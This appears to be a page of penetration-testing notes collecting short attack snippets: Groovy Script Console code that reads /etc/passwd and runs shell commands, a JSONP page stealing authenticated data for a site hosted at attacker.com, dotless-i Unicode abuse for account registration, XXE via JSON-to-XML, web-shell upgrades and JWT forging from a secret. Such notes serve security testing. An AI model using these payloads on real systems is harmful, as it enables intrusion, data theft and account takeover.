# Other

### Groovy Script Console

#### File-Read

```text
new File("/etc/passwd").withReader('UTF-8') { reader ->
def line
    while ((line = reader.readLine()) != null) { 
        println "${line}"
    }
}
```

#### RCE

```text
def process = "ls -lah".execute()
println "${process.text}"
```

```text
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'ls -lah'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "$sout"
```

### JsonP

Only useful if a jsonp endpoints requires authentication. A Victim at attacker.com will retrieve the data from victim.com and send its cookie along because of how jsonp works \(Reference: [https://www.sjoerdlangkemper.nl/2019/01/02/jsonp/](https://www.sjoerdlangkemper.nl/2019/01/02/jsonp/)\).

```javascript
<html>
<body>
<script>
function xct(a) {

alert(JSON.stringify(a));

}
</script>
<script src="targeturl?callback=xct"></script>
<body>
</html>
```

### Unicode Abuse

We can use some special characters like the dotless I to abuse "toUpperCase\(\)", registering for example an admin email address. Reference: [https://eng.getwisdom.io/hacking-github-with-unicode-dotless-i/](https://eng.getwisdom.io/hacking-github-with-unicode-dotless-i/)

### Json to XML

Change JSON Post requests to XML Format, sometimes this works and can be used for XXE, e.g. [https://twitter.com/11xuxx/status/1250764273623629826](https://twitter.com/11xuxx/status/1250764273623629826)

### HTTP/3 Clients

```text
docker run -it 'ymuski/curl-http3' bash
```

{% embed url="https://github.com/curl/curl/blob/master/docs/HTTP3.md" %}

### Interactive Shell from Web Shell

{% embed url="https://github.com/mxrch/webwrap" %}

### Timeless Timing Attacks against Remote Targets

* [https://www.youtube.com/watch?v=Oz0NtokfbqU](https://www.youtube.com/watch?v=Oz0NtokfbqU) 

The idea is to use HTTP2 to send multiple requests in one which allows us to measure the difference, by looking at which comes back first. Repeat this a lot to get some statistical relevance.

### Create JWT from Secret Key via PyJWT

```text
import jwt
data = {"data": {"username": "xct"}}
print(jwt.encode(data, "6cb9...", algorithm="HS256"))
```

